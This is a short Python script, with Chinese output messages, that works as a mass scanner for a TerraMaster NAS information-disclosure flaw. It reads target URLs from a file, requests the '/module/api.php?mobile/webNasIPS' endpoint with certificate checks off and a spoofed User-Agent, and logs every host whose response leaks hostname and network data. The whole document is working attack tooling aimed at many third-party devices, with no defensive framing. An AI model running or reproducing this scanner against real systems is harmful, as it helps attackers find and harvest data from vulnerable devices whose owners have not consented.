import requests

requests.packages.urllib3.disable_warnings()

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)"
}

for url in open("Terramaster.txt"):
	url = url.replace("\n", "")
	print(url+"正在检测中-----")
	url.replace("\n", "")
	try:
		jiaoyan = requests.get(url+"/module/api.php?mobile/webNasIPS", headers=headers, verify=False, timeout=1)
		if ("webNasIPS" in jiaoyan.text) and ("hostname" in jiaoyan.text):
			print(url+"\n======\n存在Terramaster 重要信息泄露\n======\n")
			with open("Terramaster 重要信息泄露 vul.txt", "a+") as f:
				f.write(url+"\n")
	except:
		continue